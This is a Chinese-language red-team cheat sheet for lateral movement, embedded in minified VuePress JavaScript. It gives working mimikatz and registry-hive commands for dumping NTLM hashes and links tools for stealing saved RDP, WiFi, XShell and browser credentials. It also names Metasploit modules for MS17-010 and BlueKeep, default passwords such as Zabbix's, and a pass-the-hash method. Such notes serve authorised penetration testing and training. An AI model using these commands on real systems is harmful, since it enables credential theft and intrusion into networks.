"),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("h2",{attrs:{id:"导出ntml-hash"}},[s._v("导出NTML Hash "),t("a",{staticClass:"header-anchor",attrs:{href:"#导出ntml-hash"}},[s._v("#")])]),s._v(" "),t("h3",{attrs:{id:"sharpdump-mimikatz本地读取"}},[s._v("Sharpdump+ mimikatz本地读取 "),t("a",{staticClass:"header-anchor",attrs:{href:"#sharpdump-mimikatz本地读取"}},[s._v("#")])]),s._v(" "),t("p",[s._v("需要.NET 3.5版本框架，需要系统管理员权限")]),s._v(" "),t("p",[s._v("下载地址：https://github.com/GhostPack/SharpDump")]),s._v(" "),t("p",[s._v("Dump 的文件默认是 bin 后缀，拖到本地机器把 bin 重命名为 zip，然后解压出来再丢给 mimikatz")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("mimikatz.exe “sekurlsa::minidump debug45” “sekurlsa::logonPasswords full” “exit”\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("h3",{attrs:{id:"注册表-mimikatz本地读取"}},[s._v("注册表 + mimikatz本地读取 "),t("a",{staticClass:"header-anchor",attrs:{href:"#注册表-mimikatz本地读取"}},[s._v("#")])]),s._v(" "),t("p",[t("strong",[s._v("（1）导出SAM和System文件")])]),s._v(" "),t("p",[s._v("Win2000和XP需要先提到"),t("code",[s._v("SYSTEM")]),s._v("，Server 03开始直接可以reg save 也需要"),t("code",[s._v("系统管理员权限")])]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("reg save hklm"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("sam sam.hive\nreg save hklm"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("system system.hive\nreg save hklm"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("security security.hive\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br")])]),t("p",[t("strong",[s._v("（2）mimikatz本地读取 NTML Hash")])]),s._v(" "),t("blockquote",[t("p",[s._v("mimikatz可以从内存中提取明文编码、散列值、PIN和Kerberos票据；")]),s._v(" "),t("p",[s._v("还可以用来执行哈希传递、票据传递和构建黄金票据（Golden Ticket）。")])]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#将导出的文件和mimikatz放到同一目录")]),s._v("\nmimikatz.exe "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"lsadump::sam /sam:sam.hive /system:system.hive /security:security.hive"')]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("exit")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br")])]),t("h1",{attrs:{id:"横向获取主机权限"}},[s._v("横向获取主机权限 "),t("a",{staticClass:"header-anchor",attrs:{href:"#横向获取主机权限"}},[s._v("#")])]),s._v(" "),t("h2",{attrs:{id:"获取历史连接凭证"}},[s._v("获取历史连接凭证 "),t("a",{staticClass:"header-anchor",attrs:{href:"#获取历史连接凭证"}},[s._v("#")])]),s._v(" "),t("p",[t("strong",[s._v("获取RDP连接凭证（保存过的）")])]),s._v(" "),t("p",[s._v("https://github.com/AlessandroZ/LaZagne")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("lazagne.exe windows\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#git密码也能获取到")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br")])]),t("p",[t("strong",[s._v("获取历史连接"),t("code",[s._v("wifi")]),s._v("密码")])]),s._v(" "),t("p",[s._v("https://github.com/wangle201210/wifiPass")]),s._v(" "),t("p",[t("strong",[s._v("获取XShell连接凭证")])]),s._v(" "),t("p",[s._v("https://github.com/dzxs/Xdecrypt")]),s._v(" "),t("p",[t("strong",[s._v("浏览器历史记录和凭据")])]),s._v(" "),t("p",[s._v("https://github.com/moonD4rk/HackBrowserData")]),s._v(" "),t("h2",{attrs:{id:"翻阅配置文件"}},[s._v("翻阅配置文件 "),t("a",{staticClass:"header-anchor",attrs:{href:"#翻阅配置文件"}},[s._v("#")])]),s._v(" "),t("p",[t("strong",[s._v("数据库配置文件")])]),s._v(" "),t("p",[s._v("JSP站")]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("网站目录/WEB-INF/classes/database.properties\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("MySQL数据库找密码")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("find")]),s._v(" / -name user.MYD\n/var/lib/mysql/mysql/user.MYD\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#下载下来解密MD5得到root密码")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br")])]),t("p",[t("strong",[s._v("常见应用配置文件位置")])]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("Tomcat:\t$CATALINA_HOME/conf/server.xml\nApache:\t/etc/httpd/conf/httpd.conf\nNginx:\t/etc/nginx/nginx.conf\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br")])]),t("h2",{attrs:{id:"弱口令"}},[s._v("弱口令 "),t("a",{staticClass:"header-anchor",attrs:{href:"#弱口令"}},[s._v("#")])]),s._v(" "),t("p",[s._v("1、用已知口令和常见弱口令构造字典，把"),t("code",[s._v("SNETCracker")]),s._v("代理进去扫SSH、RDP、MySQL等服务")]),s._v(" "),t("p",[s._v("2、Web后台弱口令和网络设备默认口令")]),s._v(" "),t("p",[s._v("3、技巧：如果能进到邮箱或wiki系统翻找到初始口令的话可以批量获取主机权限")]),s._v(" "),t("h2",{attrs:{id:"系统漏洞"}},[s._v("系统漏洞 "),t("a",{staticClass:"header-anchor",attrs:{href:"#系统漏洞"}},[s._v("#")])]),s._v(" "),t("p",[t("strong",[s._v("MS17-010（CVE-2017-0143）")])]),s._v(" "),t("p",[s._v("MSF有两种方式：")]),s._v(" "),t("ul",[t("li",[s._v("反弹shell："),t("code",[s._v("exploit/windows/smb/ms17_010_psexec")]),s._v("，需要在主机上进行端口转发")]),s._v(" "),t("li",[s._v("直接执行命令："),t("code",[s._v("auxiliary/admin/smb/ms17_010_command")]),s._v("，直接在主机上执行命令")])]),s._v(" "),t("p",[t("strong",[s._v("Win7_RDP_RCE（CVE-2019-0708）")])]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("auxiliary/scanner/rdp/cve_2019_0708_bluekeep\n\nexploit/windows/rdp/cve_2019_0708_bluekeep_rce\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br")])]),t("h2",{attrs:{id:"未授权访问漏洞"}},[s._v("未授权访问漏洞 "),t("a",{staticClass:"header-anchor",attrs:{href:"#未授权访问漏洞"}},[s._v("#")])]),s._v(" "),t("div",{staticClass:"language- line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[s._v("Redis未授权访问\nMongoDB未授权访问\nHadoop未授权访问漏洞\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br")])]),t("h2",{attrs:{id:"web应用漏洞"}},[s._v("Web应用漏洞 "),t("a",{staticClass:"header-anchor",attrs:{href:"#web应用漏洞"}},[s._v("#")])]),s._v(" "),t("p",[s._v("重点关注"),t("code",[s._v("Shiro反序列化")]),s._v("、"),t("code",[s._v("Weblogic")]),s._v("、"),t("code",[s._v("Struts2")]),s._v("等可直接利用的组件漏洞")]),s._v(" "),t("p",[s._v("还有SQL注入、文件上传等能Getshell的Web安全漏洞")]),s._v(" "),t("h2",{attrs:{id:"重点目标系统"}},[s._v("重点目标系统 "),t("a",{staticClass:"header-anchor",attrs:{href:"#重点目标系统"}},[s._v("#")])]),s._v(" "),t("p",[t("code",[s._v("Zabbix")]),s._v("等监控系统，默认口令（Admin/zabbix）")]),s._v(" "),t("p",[s._v("通过"),t("code",[s._v("堡垒机")]),s._v("默认口令进入堡垒机，直接主机权限路径分刷满")]),s._v(" "),t("p",[s._v("查看"),t("code",[s._v("wiki系统")]),s._v("很多组织会在其中公示一些初始密码，拿来去做弱口令扫描")]),s._v(" "),t("h2",{attrs:{id:"凭证传递攻击"}},[s._v("凭证传递攻击 "),t("a",{staticClass:"header-anchor",attrs:{href:"#凭证传递攻击"}},[s._v("#")])]),s._v(" "),t("p",[s._v("Hash传递攻击和票据传递攻击，是域渗透中的攻击方法")]),s._v(" "),t("p",[s._v("Hash传递攻击本地用户的话需要密码相同才能成功（域管理账户的话可以随意登录）")]),s._v(" "),t("p",[s._v("可以用CS直接去扫445然后抓了hash去传递")]),s._v(" "),t("blockquote",[t("p",[s._v("hash注入的原理是，将我们预备好的目标机器的本地或者是域用户hash注入到本地的认证进程"),t("code",[s._v("lsass.exe")]),s._v("中去")]),s._v(" "),t("p",[s._v("使得本地在使用"),t("code",[s._v("ipc")]),s._v("登录目标机器的时候就如同自己登录自己的机器一样获得权限")]),s._v(" "),t("p",[s._v("需要支持受限管理员模式，Server 2012-r2后默认支持受限管理员模式")])])])}),[],!1,null,null,null);a.default=n.exports}}]);